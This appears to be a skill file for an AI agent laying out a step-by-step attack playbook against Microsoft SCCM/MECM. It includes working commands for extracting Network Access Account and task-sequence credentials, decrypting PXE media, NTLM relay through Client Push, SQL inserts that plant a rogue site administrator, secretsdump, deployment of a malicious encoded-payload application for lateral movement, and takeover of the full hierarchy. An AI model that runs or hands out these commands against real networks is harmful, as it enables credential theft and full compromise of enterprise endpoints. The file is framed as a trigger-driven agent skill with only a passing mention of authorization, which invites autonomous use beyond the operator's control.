---
name: sccm-mecm-attack
description: "Attack methodology for Microsoft SCCM/MECM (Configuration Manager). Use when SCCM site servers, management points (MP), or distribution points (DP) are found on the internal network. Covers NAA credential extraction, task sequence passwords, PXE boot media, Client Push forced authentication, site server takeover, application deployment lateral movement, AdminService API abuse, and hierarchy takeover (CAS→Primary)."
zh-signals: "针对 Microsoft SCCM/MECM 的攻击方法论，覆盖 NAA 凭证提取、任务序列密码、Client Push、站点接管与横向移动。信号:SCCM,MECM,NAA凭证,Client Push,横向移动"
when-to-use: >-
  Use when internal reconnaissance reveals an SCCM/MECM site server, management point,
  or distribution point, and you need to extract credentials, abuse deployment, or
  pivot under authorization.
metadata:
  tags: "sccm,mecm,configmgr,configuration manager,NAA,network access account,client push,PXE,task sequence,site takeover,hierarchy,SharpSCCM,sccmhunter,AdminService,SCCMSecrets,distribution point"
  category: "lateral"
---

# SCCM/MECM Attacks

## Trigger Conditions

Use this skill in the following scenarios:
- SCCM / MECM / ConfigMgr services are found on the internal network (site server, MP, DP)
- DNS enumeration reveals `_mssms_mp` or `_mssms_sul` SRV records
- A Management Point (MP) or Distribution Point (DP) is found
- SCCM must be abused for lateral movement or credential acquisition
- BloodHound / LDAP enumeration reveals `mSSMSManagementPoint` objects

## Prerequisites

- Domain user credentials (some techniques support anonymous or machine account access)
- Tools: SharpSCCM, sccmhunter, SCCMSecrets, pxethiefy, cmloot, ntlmrelayx
- Network reachability: MP (TCP 80/443), DP (TCP 80/443), Site DB (TCP 1433), SMS Provider (TCP 443)

## SCCM Architecture Quick Reference

| Role | Description | Default Port | Key Identifier |
|------|------|----------|----------|
| **Primary Site Server** | Core management server | - | Runs SMS_SITE_COMPONENT_MANAGER |
| **Management Point (MP)** | Client policy distribution | 80/443 | IIS CCM_* virtual directories |
| **Distribution Point (DP)** | Content distribution | 80/443 | SMS_DP$ share / SCCMContentLib$ |
| **Site Database** | SQL Server storage | 1433 | RBAC_Admins / RBAC_ExtendedPermissions |
| **SMS Provider** | WMI/AdminService API | 443 | AdminService REST API |
| **CAS** | Top of the hierarchy (multi-site) | - | Manages multiple Primary sites |

---

## Decision Tree

```
[Start] SCCM infrastructure discovered
    │
    ├─ Do you have domain credentials?
    │   ├─ Yes → Phase 1: SCCM reconnaissance
    │   └─ No → PXE boot media / anonymous registration attempt
    │
    ├─ Credential acquisition
    │   ├─ Can register a device or control a machine account → Phase 2: secrets policy extraction
    │   └─ Already on an SCCM client → local DPAPI extraction
    │
    ├─ Privilege escalation
    │   ├─ Client Push enabled → Phase 3: forced authentication relay
    │   └─ Have SCCM administrator rights → Phase 4: lateral movement
    │
    └─ Hierarchy takeover
        └─ Multi-site environment → Phase 5: CAS propagation
```

---

## Phase 1: SCCM Reconnaissance

**Objective**: Discover and identify SCCM infrastructure components

### 1.1 DNS SRV Record Queries

```bash
# Find the Management Point
nslookup -type=SRV _mssms_mp._tcp.$DOMAIN
dig SRV _mssms_mp._tcp.$DOMAIN

# Find the Software Update Point
nslookup -type=SRV _mssms_sul._tcp.$DOMAIN
```

### 1.2 LDAP Enumeration

```powershell
# Find Management Point objects
([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}

# Find SCCM-related SPNs
setspn -Q *SMS* | findstr /i "SMS"
setspn -Q *SCCM* | findstr /i "SCCM"
```

### 1.3 Automated Reconnaissance with sccmhunter

```bash
# Discover SCCM infrastructure
sccmhunter.py find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP

# Confirm the roles via SMB enumeration
sccmhunter.py smb -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP

# Show the discovery results
sccmhunter.py show -smb
sccmhunter.py show -all
```

### 1.4 Local Information Gathering

```powershell
# Local site information (SCCM client already installed)
SharpSCCM.exe local site-info

# WMI query
Get-WmiObject -Class SMS_Authority -Namespace root\CCM
```

### 1.5 PXE Boot Media Discovery

```bash
# Probe the PXE environment (no domain credentials required)
pxethiefy.py explore -i $INTERFACE
```

---

## Phase 2: Credential Acquisition

**Objective**: Extract NAA credentials, task sequence passwords, and sensitive DP files

### 2.1 NAA Extraction — Register a New Device

```bash
# HTTP MP — SCCMSecrets (recommended)
python3 SCCMSecrets.py policies -mp "http://$MP_IP" \
  -u "$MACHINE_NAME" -p "$MACHINE_PASSWORD" -cn "newdevice"

# HTTPS MP (PKI environment)
python3 SCCMSecrets.py policies -mp "https://$MP_IP" \
  -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice' \
  --pki-cert ./cert.pem --pki-key ./key.pem

# NTLM relay policy extraction
ntlmrelayx.py -t 'http://$MP_IP/ccm_system_windowsauth/request' \
  -smb2support --sccm-policies

# sccmhunter automation
sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto
```

```powershell
# Windows — SharpSCCM
SharpSCCM.exe get secrets -r newdevice -u $MACHINE_NAME -p $PASSWORD
```

### 2.2 PXE Boot Media Password Extraction

```bash
# After discovering PXE in Phase 1, decrypt the credentials in the boot media
pxethiefy.py decrypt -f $PXE_MEDIA_FILE
```

### 2.3 NAA Extraction — Reuse an Existing Device

```bash
# Use the registration credentials of an already compromised device
python3 SCCMSecrets.py policies -mp "http://$MP_IP" \
  --use-existing-device compromised_device/
```

### 2.4 Local DPAPI Extraction

```bash
# SystemDPAPIdump (remote)
SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@$TARGET
```

```powershell
# SharpSCCM local
SharpSCCM.exe local secrets disk
SharpSCCM.exe local secrets wmi

# SharpDPAPI
SharpDPAPI.exe SCCM
```

```
# mimikatz
dpapi::sccm
```

### 2.5 Direct WMI Queries

```powershell
# NAA credential (encrypted blob)
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig \
  -Class CCM_NetworkAccessAccount

# Task sequence variables
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig \
  -Class CCM_TaskSequence
```

### 2.6 Distribution Point File Harvesting

```bash
# SCCMSecrets — harvest by extension
python3 SCCMSecrets.py files -dp "http://$DP_IP" \
  -u '$USER' -H '$HASH' \
  --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'

# cmloot — bulk harvesting
python3 cmloot.py $DOMAIN/$USER@$TARGET \
  -findsccmservers -target-file sccmhosts.txt \
  -cmlootdownload sccmfiles.txt
```

---

## Phase 3: Privilege Escalation

**Objective**: Obtain site administrator rights via Client Push / Site DB / AdminService relay

### 3.1 Client Push Forced Authentication

**Principle**: Client Push installation triggers NTLM authentication from a high-privilege account against the target, which can then be relayed to other targets.

```bash
# Start the relay
ntlmrelayx.py -smb2support -socks -ts -ip $ATTACKER_IP -t $TARGET
```

```powershell
# Trigger Client Push
SharpSCCM.exe invoke client-push -t $TARGET --as-admin
```

### 3.2 Site Takeover — MSSQL Relay

**Principle**: The site server machine account has sysadmin rights on the Site Database, so relaying to MSSQL allows injecting an administrator.

```bash
# Step 1: start the MSSQL relay
ntlmrelayx.py -t "mssql://$SITE_DB" -smb2support -socks

# Step 2: trigger site server authentication (Coercer / PetitPotam, etc.)
# Step 3: connect to SQL over SOCKS
proxychains mssqlclient.py "DOMAIN/$SITE_SERVER$"@"$SITE_DB" -windows-auth
```

```sql
-- Step 4: inject the SCCM administrator
-- First obtain the SID of the target user
USE CM_$SITE_CODE;
INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)
VALUES ($ADMIN_SID, '$DOMAIN\$USER', '$DOMAIN\$USER', 0, 0, '', '', '', '', '$SITE_CODE');

INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
        'SMS0001R', 'SMS00ALL', 29);

INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
        'SMS0001R', 'SMS00001', 1);

INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
        'SMS0001R', 'SMS00004', 1);
```

### 3.3 Site Takeover — AdminService Relay

```bash
# Relay to the AdminService of the SMS Provider
ntlmrelayx.py -t "https://$SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
  -smb2support --adminservice \
  --logonname "$DOMAIN\\$USER" \
  --displayname "$DOMAIN\\$USER" \
  --objectsid $OBJECTSID
```

### 3.4 Passive → Active Site Server Relay

```bash
# Relay the passive site server to the active site server
ntlmrelayx.py -t $ACTIVE_SERVER -smb2support -socks

# Dump hashes over SOCKS
proxychains4 secretsdump.py $DOMAIN/$PASSIVE_SERVER\$@$ACTIVE_SERVER

# Take over with the identity of the active site server
sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:$NTHASH -ip $SMS_PROVIDER_IP
```

---

## Phase 4: Lateral Movement

**Objective**: Execute commands on clients using SCCM administrator rights

### 4.1 Application Deployment

```powershell
# SharpSCCM — execute against a specific resource ID
SharpSCCM.exe exec -rid $RESOURCE_ID -r $TARGET
```

### 4.2 Full PowerSCCM Workflow

```powershell
# Discover the site code
Find-SccmSiteCode -ComputerName $SITE_SERVER

# Establish a session
$session = New-SccmSession -ComputerName $SITE_SERVER -SiteCode $SITE_CODE -Credential $CRED

# Create a malicious application
New-SccmApplication -Session $session -ApplicationName "evilApp" \
  -PowerShellB64 $ENCODED_PAYLOAD

# Deploy to the target
New-SccmApplicationDeployment -Session $session -ApplicationName "evilApp" \
  -AssignmentName "deploy" -CollectionName "target_collection"

# Force the client to check in
Invoke-SCCMDeviceCheckin -Session $session -CollectionName "target_collection"
```

### 4.3 CMScript Execution

```powershell
New-CMScriptDeployement -CMDrive 'E' -ServerFQDN '$SITE_SERVER' \
  -TargetDevice '$TARGET' -Path '.\payload.ps1' -ScriptName 'evilScript'
```

### 4.4 AdminService API Interaction

```bash
# sccmhunter admin console
sccmhunter.py admin -u "$USER" -p "$PASSWORD" -ip "$SITE_SERVER_IP"

# Interactive commands: help, interact, ps, ls, cat, exec, etc.
```

---

## Phase 5: Hierarchy Takeover

**Objective**: Expand from a single site to the entire SCCM hierarchy

### 5.1 Automatic CAS Propagation

An administrator added to any Primary site automatically propagates to the CAS and all child sites. After running `add_admin` on one Primary using Phase 3, simply wait for replication to synchronize and every site is under your control.

```bash
# Inside an sccmhunter admin session
add_admin $DOMAIN\\$USER $ADMIN_SID
```

### 5.2 TAKEOVER-5: Cross-Site AdminService Relay

In a multi-site environment, relay to the AdminService of a remote SMS Provider to add an administrator.

```bash
ntlmrelayx.py -t "https://$REMOTE_SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
  -smb2support --adminservice \
  --logonname "$DOMAIN\\$USER" \
  --displayname "$DOMAIN\\$USER" \
  --objectsid $OBJECTSID
```

> **Note**: ConfigMgr 2509+ rejects NTLM authentication on AdminService by default, so this technique only applies to earlier versions.

---

## Common Issue Troubleshooting

### Unable to Register a New Device

1. The MP requires HTTPS + a client certificate — obtain a PKI certificate or relay
2. Automatic approval is not enabled — try relaying the authentication of an already approved device
3. The site is configured for "domain-joined devices only" — use an existing machine account

### NAA Extraction Returns Nothing

1. The site has no NAA configured (eNAA environment) — try task sequence extraction
2. The NAA password has expired — check the Collection Variables
3. The WMI policy has not been pushed yet — wait for the policy refresh cycle

### Relay Failure

1. The target enforces SMB signing — SMB cannot be relayed, use HTTP/MSSQL instead
2. EPA (Extended Protection for Authentication) — bypassing it requires the TLS certificate private key
3. ConfigMgr 2509+ denies NTLM on AdminService — use the MSSQL path instead

---

## Tool Reference

| Tool | Purpose | Platform |
|------|------|------|
| sccmhunter | SCCM reconnaissance/exploitation/management | Linux |
| SharpSCCM | SCCM client exploitation | Windows |
| SCCMSecrets | Policy/NAA/DP extraction | Linux |
| pxethiefy | PXE boot media analysis | Linux |
| cmloot / sccm-http-looter | DP file harvesting | Linux |
| ntlmrelayx | NTLM relay attacks | Linux |
| PowerSCCM | SCCM management operations | Windows |

---

## Further Reading

- → [references/sccm-enumeration.md](references/sccm-enumeration.md) — SCCM reconnaissance methodology and tool command reference
- → [references/credential-harvesting.md](references/credential-harvesting.md) — details on secrets policy extraction and NAA/task sequence/DP credential acquisition
- → [references/site-takeover.md](references/site-takeover.md) — complete attack chains for site takeover and lateral movement
